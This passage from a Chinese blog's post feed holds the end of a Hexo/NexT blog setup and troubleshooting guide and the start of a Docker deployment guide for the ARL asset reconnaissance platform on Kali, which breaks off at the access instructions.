<li><code>source/categories/index.md</code>：<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">分类</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2025-11-11</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;categories&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure></li>
<li><code>source/tags/index.md</code>：<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">标签</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2025-11-11</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;tags&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>4.3 步骤2：给文章分配「分类&#x2F;标签」</strong><br>编辑每篇文章（<code>source/_posts/xxx.md</code>）的 Front-matter：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">&quot;什么是SSH隧道及相关技术&quot;</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2025-11-10</span></span><br><span class="line"><span class="attr">updated:</span> <span class="number">2025-11-11</span></span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">技术</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">网络安全</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">SSH</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">隧道技术</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">服务器</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>

<p><strong>4.4 步骤3：让分类&#x2F;标签显示在导航栏</strong><br>在 <code>themes/next/_config.yml</code> 的 <code>menu</code> 配置中，添加 <code>categories</code> 和 <code>tags</code> 菜单项（已在上文2.2节中包含）。</p>
<hr>
<p><strong>二、优化导航与功能：让博客更好用</strong></p>
<p><strong>1. 开启「搜索功能」（必备！）</strong><br>已在 <code>themes/next/_config.yml</code> 中配置 <code>local_search</code>，确保已安装 <code>hexo-generator-searchdb</code> 插件。</p>
<p><strong>2. 代码高亮优化（程序员必备）</strong><br>已在 <code>themes/next/_config.yml</code> 中配置 <code>codeblock.copy_button</code>，并在 <code>hexo/_config.yml</code> 中启用了 <code>highlight.line_number</code>。</p>
<p><strong>3. 图片处理：避免失效+优化显示</strong></p>
<ul>
<li><strong>方案1：本地图片（推荐）</strong>：通过 <code>post_asset_folder: true</code> + <code>marked.post_asset: true</code> 配置，脚本已自动将图片存入文章同名文件夹，使用 <code>![描述](图片名.png)</code> 的相对路径，<strong>永不失效</strong>。</li>
<li><strong>方案2：图床</strong>：若需多设备编辑，可用PicGo上传至GitHub图床，复制链接粘贴。<strong>但强烈推荐方案1</strong>，数据完全可控。</li>
<li><strong>优化显示</strong>：在Markdown中，使用以下代码让图片居中并限制宽度：<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&lt;!-- 居中+限制宽度 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;图片链接&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;描述&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: block; margin: 0 auto; max-width: 80%;&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h1 id="五、外观优化：让博客更个性化"><a href="#五、外观优化：让博客更个性化" class="headerlink" title="五、外观优化：让博客更个性化"></a>五、外观优化：让博客更个性化</h1><p><strong>5.1 选择Next主题风格（Scheme）</strong><br>在 <code>themes/next/_config.yml</code> 中设置：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">scheme:</span> <span class="string">Gemini</span>  <span class="comment"># 推荐：简洁大气，适配分类/标签</span></span><br><span class="line"><span class="comment"># scheme: Mist  # 更紧凑</span></span><br><span class="line"><span class="comment"># scheme: Pisces # 卡片式</span></span><br><span class="line"><span class="comment"># scheme: Muse  # 默认</span></span><br></pre></td></tr></table></figure>

<p><strong>5.2 自定义颜色&#x2F;字体</strong><br>编辑 <code>themes/next/source/css/_custom/custom.styl</code> 文件：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 自定义导航栏背景色</span></span><br><span class="line"><span class="selector-class">.header</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#2c3e50</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义链接颜色</span></span><br><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#3498db</span>;</span><br><span class="line">  <span class="selector-pseudo">&amp;:hover</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#e74c3c</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局字体（推荐思源黑体）</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">&quot;Source Han Sans CN&quot;</span>, <span class="string">&quot;PingFang SC&quot;</span>, <span class="string">&quot;Microsoft YaHei&quot;</span>, sans-serif;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 代码字体（推荐Fira Code）</span></span><br><span class="line"><span class="selector-tag">code</span>, pre &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">&quot;Fira Code&quot;</span>, <span class="string">&quot;Consolas&quot;</span>, monospace;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 页面背景图（可选）</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;/images/bg.jpg&#x27;</span>);</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br><span class="line">  <span class="attribute">background-attachment</span>: fixed;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>);</span><br><span class="line">  <span class="attribute">background-blend-mode</span>: overlay;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>注意</strong>：将背景图 <code>bg.jpg</code> 放入 <code>source/images/</code> 目录下。</p>
</blockquote>
<p><strong>5.3 添加背景图&#x2F;头像</strong></p>
<ul>
<li><strong>头像</strong>：在 <code>themes/next/_config.yml</code> 中设置：<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/avatar.jpg</span>  <span class="comment"># 图片放在 source/images/ 目录下</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">opacity:</span> <span class="number">1.0</span></span><br></pre></td></tr></table></figure></li>
<li><strong>背景图</strong>：已在上文 <code>custom.styl</code> 中配置。</li>
</ul>
<hr>
<h1 id="六、增强互动与体验：添加评论-阅读量"><a href="#六、增强互动与体验：添加评论-阅读量" class="headerlink" title="六、增强互动与体验：添加评论&#x2F;阅读量"></a>六、增强互动与体验：添加评论&#x2F;阅读量</h1><p><strong>6.1 评论系统（推荐 Gitalk，适配 GitHub Pages）</strong><br>已在 <code>themes/next/_config.yml</code> 中配置 <code>gitalk</code>，请按说明申请GitHub OAuth App并填入 <code>client_id</code> 和 <code>client_secret</code>。</p>
<p><strong>2. 阅读量统计（不蒜子，无需注册）</strong><br>已在 <code>themes/next/_config.yml</code> 中启用 <code>busuanzi_count</code>。</p>
<hr>
<h1 id="七、SEO优化：让博客被搜索引擎收录"><a href="#七、SEO优化：让博客被搜索引擎收录" class="headerlink" title="七、SEO优化：让博客被搜索引擎收录"></a>七、SEO优化：让博客被搜索引擎收录</h1><p><strong>7.1 配置站点信息（Hexo根目录 <code>_config.yml</code>）</strong><br>已在上文2.1节中包含 <code>title</code>, <code>subtitle</code>, <code>description</code>, <code>keywords</code>, <code>author</code>, <code>language</code>, <code>timezone</code>。</p>
<p><strong>7.2 生成站点地图</strong><br>已在上文1.3节安装了 <code>hexo-generator-sitemap</code> 和 <code>hexo-generator-baidu-sitemap</code> 插件。无需额外配置，它们会自动生成 <code>sitemap.xml</code> 和 <code>baidu_sitemap.xml</code>。</p>
<p><strong>7.3 提交站点到搜索引擎</strong></p>
<ul>
<li><strong>Google 搜索控制台</strong>：添加你的域名，提交 <code>https://你的博客地址/sitemap.xml</code>。</li>
<li><strong>百度搜索资源平台</strong>：添加你的域名，提交 <code>https://你的博客地址/baidu_sitemap.xml</code>。</li>
</ul>
<hr>
<h1 id="八、细节优化：提升质感"><a href="#八、细节优化：提升质感" class="headerlink" title="八、细节优化：提升质感"></a>八、细节优化：提升质感</h1><p><strong>8.1 文章排版</strong></p>
<ul>
<li><strong>折叠块</strong>（适合长代码&#x2F;补充说明）：<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">details</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">summary</span>&gt;</span></span>点击查看补充说明<span class="language-xml"><span class="tag">&lt;/<span class="name">summary</span>&gt;</span></span></span><br><span class="line">这里是折叠的内容...</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">details</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li>
<li><strong>每篇文章添加「前言&#x2F;小结」</strong>，让结构更清晰。</li>
</ul>
<p><strong>8.2 404 页面</strong><br>创建 <code>source/404.md</code>：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">页面不存在</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2025-11-11</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="string">&lt;div</span> <span class="string">style=&quot;text-align:</span> <span class="string">center;</span> <span class="attr">margin-top:</span> <span class="string">50px;&quot;&gt;</span></span><br><span class="line">  <span class="string">&lt;h1&gt;404</span> <span class="bullet">-</span> <span class="string">页面走丢啦～&lt;/h1&gt;</span></span><br><span class="line">  <span class="string">&lt;p&gt;你访问的页面不存在或已被移动&lt;/p&gt;</span></span><br><span class="line">  <span class="string">&lt;a</span> <span class="string">href=&quot;/&quot;</span> <span class="string">style=&quot;color:</span> <span class="comment">#3498db; font-size: 18px;&quot;&gt;返回首页&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>8.3 关闭无用功能</strong><br>在 <code>themes/next/_config.yml</code> 中关闭不需要的功能：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">sharejs:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="九、部署与备份"><a href="#九、部署与备份" class="headerlink" title="九、部署与备份**"></a>九、部署与备份**</h1><p><strong>9.1 部署流程</strong><br>每次修改后，执行以下命令部署：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo generate &amp;&amp; hexo deploy</span><br></pre></td></tr></table></figure>

<p><strong>9.2 本地测试</strong><br>在部署前，务必先在本地测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate --debug</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>
<p>访问 <code>http://localhost:4000</code>，检查：</p>
<ul>
<li>✅ 文章正常显示</li>
<li>✅ 图片正确加载</li>
<li>✅ 样式正常</li>
<li>✅ 搜索、分类、标签功能正常</li>
</ul>
<p><strong>9.3 备份</strong><br>将 Hexo 根目录的 <code>_config.yml</code>、<code>themes/next/_config.yml</code>、<code>source/</code> 目录（文章+图片）备份到 GitHub（新建一个仓库，比如 <code>blog-source</code>），避免电脑故障丢失数据。</p>
<hr>
<h1 id="十、故障排除大全"><a href="#十、故障排除大全" class="headerlink" title="十、故障排除大全"></a>十、故障排除大全</h1><p><strong>10.1 图片不显示问题</strong></p>
<ul>
<li><strong>症状</strong>：图片显示为空白或404。</li>
<li><strong>解决方案</strong>：<ol>
<li><strong>检查配置</strong>：确保 <code>_config.yml</code> 中 <code>post_asset_folder: true</code> 和 <code>marked.prepend_root: true</code> 已开启。</li>
<li><strong>清理缓存</strong>：执行 <code>hexo clean</code> 后重新 <code>hexo generate</code>。</li>
<li><strong>检查路径</strong>：浏览器F12查看Network标签，确认图片请求的URL是 <code>文章名/图片名.png</code> 的相对路径。</li>
</ol>
</li>
</ul>
<p><strong>10.2 部署失败问题</strong></p>
<ul>
<li><strong>常见错误1：权限拒绝</strong><ul>
<li><strong>解决方案</strong>：使用HTTPS地址或配置SSH密钥。</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/用户名/你的用户名.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure></li>
<li><strong>常见错误2：分支不存在</strong><ul>
<li><strong>解决方案</strong>：确认你的GitHub仓库默认分支是 <code>main</code> 还是 <code>gh-pages</code>，并相应修改 <code>branch</code> 配置。</li>
</ul>
</li>
</ul>
<p><strong>10.3 主题显示异常</strong></p>
<ul>
<li><strong>解决方案</strong>：<ol>
<li>确认主题安装：<code>npm list hexo-theme-next</code>。</li>
<li>检查 <code>hexo/_config.yml</code> 中 <code>theme: next</code>。</li>
<li>清理重新安装：<code>rm -rf node_modules &amp;&amp; npm install</code>。</li>
</ol>
</li>
</ul>
<p><strong>10.4 时间显示问题</strong></p>
<ul>
<li><strong>症状</strong>：文章时间相差8小时。</li>
<li><strong>解决方案</strong>：确保 <code>hexo/_config.yml</code> 中 <code>timezone: &#39;Asia/Shanghai&#39;</code>。</li>
</ul>
<hr>
<h1 id="十一、优化与进阶"><a href="#十一、优化与进阶" class="headerlink" title="十一、优化与进阶"></a>十一、优化与进阶</h1><p><strong>11.1 性能优化</strong></p>
<ul>
<li>在 <code>themes/next/_config.yml</code> 中启用 <code>lazyload: enable: true</code>。</li>
<li>在 <code>hexo/_config.yml</code> 中启用 <code>highlight.line_number: true</code>。</li>
</ul>
<p><strong>11.2 自定义域名</strong></p>
<ul>
<li>在 <code>source/</code> 目录下创建一个名为 <code>CNAME</code> 的文件。</li>
<li>文件内容写入你的域名，例如：<code>yourdomain.com</code>。</li>
<li>在你的域名DNS服务商处，添加一条CNAME记录，指向 <code>你的用户名.github.io</code>。</li>
</ul>
<hr>
<h1 id="十二、实用命令速查"><a href="#十二、实用命令速查" class="headerlink" title="十二、实用命令速查"></a>十二、实用命令速查</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建新文章</span></span><br><span class="line">hexo new <span class="string">&quot;文章标题&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地写作（预览草稿）</span></span><br><span class="line">hexo server --draft</span><br><span class="line"></span><br><span class="line"><span class="comment"># 仅生成静态文件</span></span><br><span class="line">hexo generate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制清理缓存</span></span><br><span class="line">hexo clean --debug</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看Hexo版本</span></span><br><span class="line">hexo version</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一键部署（最常用）</span></span><br><span class="line">hexo clean &amp;&amp; hexo generate &amp;&amp; hexo deploy</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="十三、博客协作更新"><a href="#十三、博客协作更新" class="headerlink" title="十三、博客协作更新"></a>十三、博客协作更新</h1><p>13.1 拉取myBlog + 配置git</p>
<ul>
<li>git clone <a href="mailto:&#103;&#x69;&#116;&#64;&#x67;&#105;&#x74;&#x68;&#117;&#98;&#x2e;&#x63;&#111;&#109;">git@github.com</a>:用户名&#x2F;myBlog.git</li>
<li>git init (初始化刚拉取的myBlog)</li>
<li>git remote add origin <a href="mailto:&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#x74;&#104;&#117;&#x62;&#46;&#x63;&#111;&#x6d;">git@github.com</a>:用户名&#x2F;myBlog.git (关联仓库)</li>
</ul>
<p>13.2 下载nodejs + hexo</p>
<ul>
<li>官网下载nodejs</li>
<li>下载 hexo npm install -g hexo-cli</li>
</ul>
<p>13.3 nmp 相关插件下载</p>
<ul>
<li>npm install</li>
<li>npm install hexo-deployer-git –save</li>
</ul>
<blockquote>
<p>因为 myBlog 已经hexo 初始化完毕，不需要再进行初始化<br>myBlog 私仓用于博客协作更新（用git）, 用hexo deploy 更新博客仓</p>
</blockquote>
<p>注意：每次修改文章或其他文件时，hexo clean -&gt; hexo g -&gt; hexo deploy -&gt; git add . -&gt; git commit …. -&gt; git push origin main</p>
]]></content>
      <categories>
        <category>知识杂碎</category>
      </categories>
      <tags>
        <tag>Blog</tag>
        <tag>Hexo</tag>
        <tag>Next</tag>
      </tags>
  </entry>
  <entry>
    <title>ARL食用指南</title>
    <url>/2025/12/30/ARL%E9%A3%9F%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h2 id="一、部署前环境准备"><a href="#一、部署前环境准备" class="headerlink" title="一、部署前环境准备"></a>一、部署前环境准备</h2><h3 id="1-核心依赖：Docker-Docker-Compose（插件版）"><a href="#1-核心依赖：Docker-Docker-Compose（插件版）" class="headerlink" title="1. 核心依赖：Docker + Docker Compose（插件版）"></a>1. 核心依赖：Docker + Docker Compose（插件版）</h3><p>Kali 2025 默认预装 Docker，但需确认 <strong>Docker Compose 插件版</strong> 可用（避免独立包冲突）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 验证 Docker 是否运行</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl status docker</span><br><span class="line"><span class="comment"># 验证 Docker Compose 插件版（无横杠，官方推荐）</span></span><br><span class="line">docker compose version</span><br></pre></td></tr></table></figure>

<h4 id="问题1：Docker-Compose-安装冲突（独立包-vs-插件版）"><a href="#问题1：Docker-Compose-安装冲突（独立包-vs-插件版）" class="headerlink" title="问题1：Docker Compose 安装冲突（独立包 vs 插件版）"></a>问题1：Docker Compose 安装冲突（独立包 vs 插件版）</h4><ul>
<li>现象：执行 <code>sudo apt install docker-compose</code> 时提示“trying to overwrite…”</li>
<li>解决：使用系统预装的插件版，无需安装独立包；若已安装独立包，先卸载冲突组件：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 卸载冲突的独立包</span></span><br><span class="line"><span class="built_in">sudo</span> apt remove -y docker-compose</span><br><span class="line"><span class="comment"># 确保插件版可用</span></span><br><span class="line"><span class="built_in">sudo</span> apt install -y docker-compose-plugin</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="二、配置-Docker-国内加速器（解决镜像拉取慢-中断）"><a href="#二、配置-Docker-国内加速器（解决镜像拉取慢-中断）" class="headerlink" title="二、配置 Docker 国内加速器（解决镜像拉取慢&#x2F;中断）"></a>二、配置 Docker 国内加速器（解决镜像拉取慢&#x2F;中断）</h2><p>Docker 默认拉取国外镜像源，必须配置国内加速器（你遇到过格式错误、源不稳定问题）。</p>
<h3 id="1-编辑-Docker-配置文件"><a href="#1-编辑-Docker-配置文件" class="headerlink" title="1. 编辑 Docker 配置文件"></a>1. 编辑 Docker 配置文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开配置文件（若不存在则自动创建）</span></span><br><span class="line"><span class="built_in">sudo</span> vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>

<h3 id="2-写入正确格式的加速源（避免逗号缺失）"><a href="#2-写入正确格式的加速源（避免逗号缺失）" class="headerlink" title="2. 写入正确格式的加速源（避免逗号缺失）"></a>2. 写入正确格式的加速源（避免逗号缺失）</h3><p><strong>正确配置（含国内稳定源）</strong>：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;https://docker.m.daocloud.io&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;https://docker.1panel.live&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;https://hub.rat.dev&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;https://docker.xuanyuan.me&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;https://registry.cn-hangzhou.aliyuncs.com&quot;</span>  <span class="comment">// 阿里云公共源（最稳定）</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


<h3 id="3-使加速配置生效"><a href="#3-使加速配置生效" class="headerlink" title="3. 使加速配置生效"></a>3. 使加速配置生效</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重新加载配置</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="comment"># 重启 Docker 服务</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br><span class="line"><span class="comment"># 验证加速源是否生效</span></span><br><span class="line">docker info | grep <span class="string">&quot;Registry Mirrors&quot;</span> -A 5</span><br></pre></td></tr></table></figure>
<ul>
<li>生效标志：输出中显示配置的所有加速源。</li>
</ul>
<h2 id="三、克隆-ARL-代码"><a href="#三、克隆-ARL-代码" class="headerlink" title="三、克隆 ARL 代码"></a>三、克隆 ARL 代码</h2><p>使用加速链接克隆 ARL 代码（你之前用的 <code>gh.llkk.cc</code> 加速）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入工具目录（自定义路径，示例为 ~/Web/web-tools）</span></span><br><span class="line"><span class="built_in">cd</span> ~/Web/web-tools</span><br><span class="line"><span class="comment"># 克隆代码（加速链接）</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:ki9mu/ARL-plus-docker ARL</span><br><span class="line"><span class="comment"># 进入 ARL 目录（后续所有命令需在此执行）</span></span><br><span class="line"><span class="built_in">cd</span> ARL</span><br></pre></td></tr></table></figure>


<h2 id="四、拉取-ARL-依赖镜像（解决拉取中断问题）"><a href="#四、拉取-ARL-依赖镜像（解决拉取中断问题）" class="headerlink" title="四、拉取 ARL 依赖镜像（解决拉取中断问题）"></a>四、拉取 ARL 依赖镜像（解决拉取中断问题）</h2><p>ARL 依赖 3 个核心镜像：<code>mongo:4.0.27</code>、<code>ki9mu/shadow-rabbitmq:latest</code>、<code>ki9mu/arl-ki9mu:v3.0.1</code>。</p>
<h3 id="1-优先创建数据卷（持久化数据库数据）"><a href="#1-优先创建数据卷（持久化数据库数据）" class="headerlink" title="1. 优先创建数据卷（持久化数据库数据）"></a>1. 优先创建数据卷（持久化数据库数据）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker volume create arl_db</span><br></pre></td></tr></table></figure>

<h3 id="2-拉取镜像（避免批量拉取中断，可逐个拉取）"><a href="#2-拉取镜像（避免批量拉取中断，可逐个拉取）" class="headerlink" title="2. 拉取镜像（避免批量拉取中断，可逐个拉取）"></a>2. 拉取镜像（避免批量拉取中断，可逐个拉取）</h3><h4 id="方法1：批量拉取（加速源稳定时用）"><a href="#方法1：批量拉取（加速源稳定时用）" class="headerlink" title="方法1：批量拉取（加速源稳定时用）"></a>方法1：批量拉取（加速源稳定时用）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker compose pull</span><br></pre></td></tr></table></figure>

<h4 id="方法2：逐个拉取（解决批量拉取反复中断）"><a href="#方法2：逐个拉取（解决批量拉取反复中断）" class="headerlink" title="方法2：逐个拉取（解决批量拉取反复中断）"></a>方法2：逐个拉取（解决批量拉取反复中断）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 拉取 MongoDB 镜像</span></span><br><span class="line">docker pull mongo:4.0.27</span><br><span class="line"><span class="comment"># 拉取 RabbitMQ 镜像</span></span><br><span class="line">docker pull ki9mu/shadow-rabbitmq:latest</span><br><span class="line"><span class="comment"># 拉取 ARL 核心镜像</span></span><br><span class="line">docker pull ki9mu/arl-ki9mu:v3.0.1</span><br></pre></td></tr></table></figure>

<h4 id="问题3：镜像拉取反复中断"><a href="#问题3：镜像拉取反复中断" class="headerlink" title="问题3：镜像拉取反复中断"></a>问题3：镜像拉取反复中断</h4><ul>
<li>现象：拉取过程中自动退出，进度无法完成</li>
<li>解决：<ol>
<li>补充阿里云加速源（见第二步）；</li>
<li>重启 Docker 后<strong>逐个拉取镜像</strong>；</li>
<li>若仍中断，切换网络（如手机热点）后重试。</li>
</ol>
</li>
</ul>
<h3 id="3-验证镜像是否拉取完成"><a href="#3-验证镜像是否拉取完成" class="headerlink" title="3. 验证镜像是否拉取完成"></a>3. 验证镜像是否拉取完成</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images | grep -E <span class="string">&quot;mongo:4.0.27|ki9mu/shadow-rabbitmq|ki9mu/arl-ki9mu&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>成功标志：输出包含 3 个镜像的信息。</li>
</ul>
<h2 id="五、ARL-核心操作：启动-关闭-重启"><a href="#五、ARL-核心操作：启动-关闭-重启" class="headerlink" title="五、ARL 核心操作：启动&#x2F;关闭&#x2F;重启"></a>五、ARL 核心操作：启动&#x2F;关闭&#x2F;重启</h2><p>所有命令需在 <strong>ARL 目录（~&#x2F;Web&#x2F;web-tools&#x2F;ARL）</strong> 执行，确保能读取 <code>docker-compose.yml</code> 文件。</p>
<h3 id="1-启动-ARL（后台运行）"><a href="#1-启动-ARL（后台运行）" class="headerlink" title="1. 启动 ARL（后台运行）"></a>1. 启动 ARL（后台运行）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
<ul>
<li>作用：启动所有依赖容器（MongoDB、RabbitMQ、ARL 核心服务），后台运行不占用终端。</li>
<li>验证启动成功：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker compose ps</span><br></pre></td></tr></table></figure>
成功标志：所有容器 <code>STATE</code> 为 <code>Up</code>。</li>
</ul>
<h3 id="2-关闭-ARL（停止所有服务）"><a href="#2-关闭-ARL（停止所有服务）" class="headerlink" title="2. 关闭 ARL（停止所有服务）"></a>2. 关闭 ARL（停止所有服务）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker compose down</span><br></pre></td></tr></table></figure>
<ul>
<li>作用：停止并销毁所有容器（数据不会丢失，因为数据存在 <code>arl_db</code> 数据卷中）。</li>
<li>场景：长时间不使用时关闭，节省系统资源。</li>
</ul>
<h3 id="3-重启-ARL（修改配置后用）"><a href="#3-重启-ARL（修改配置后用）" class="headerlink" title="3. 重启 ARL（修改配置后用）"></a>3. 重启 ARL（修改配置后用）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker compose restart</span><br></pre></td></tr></table></figure>
<ul>
<li>作用：重启所有容器，适用于修改 ARL 配置后生效。</li>
</ul>
<h3 id="4-查看-ARL-运行状态"><a href="#4-查看-ARL-运行状态" class="headerlink" title="4. 查看 ARL 运行状态"></a>4. 查看 ARL 运行状态</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker compose ps</span><br></pre></td></tr></table></figure>
<ul>
<li>输出说明：<ul>
<li><code>NAME</code>：容器名称（如 <code>arl_web</code> 是 Web 界面容器）；</li>
<li><code>STATE</code>：<code>Up</code> 表示运行中，<code>Exited</code> 表示已停止；</li>
<li><code>PORTS</code>：端口映射（如 <code>0.0.0.0:5003-&gt;443/tcp</code> 表示 5003 端口映射到 HTTPS 服务）。</li>
</ul>
</li>
</ul>
<h3 id="5-查看-ARL-日志"><a href="#5-查看-ARL-日志" class="headerlink" title="5. 查看 ARL 日志"></a>5. 查看 ARL 日志</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看所有容器日志（实时输出）</span></span><br><span class="line">docker compose logs -f</span><br><span class="line"><span class="comment"># 查看单个容器日志（如 Web 容器，排查访问问题）</span></span><br><span class="line">docker compose logs -f web</span><br><span class="line"><span class="comment"># 查看 MongoDB 容器日志（排查数据库问题）</span></span><br><span class="line">docker compose logs -f mongodb</span><br></pre></td></tr></table></figure>
<ul>
<li>场景：容器启动失败（<code>STATE</code> 为 <code>Exited</code>）时，通过日志定位报错原因。</li>
</ul>
<h2 id="六、访问-ARL-系统"><a href="#六、访问-ARL-系统" class="headerlink" title="六、访问 ARL 系统"></a>六、访问 ARL 系统</h2><h3 id="1-正确访问地址"><a href="#1-正确访问地址" class="headerlink" title="1. 正确访问地址"></a>1. 正确访问地址</h3><p>从容器端口映射可知：<code>arl_web</code> 将主机 <code>5003</code> 端口映射到容器 <code>443</code> 端口（HTTPS），因此必须用 <strong><code>https</code> 开头</strong>的地址：</p>
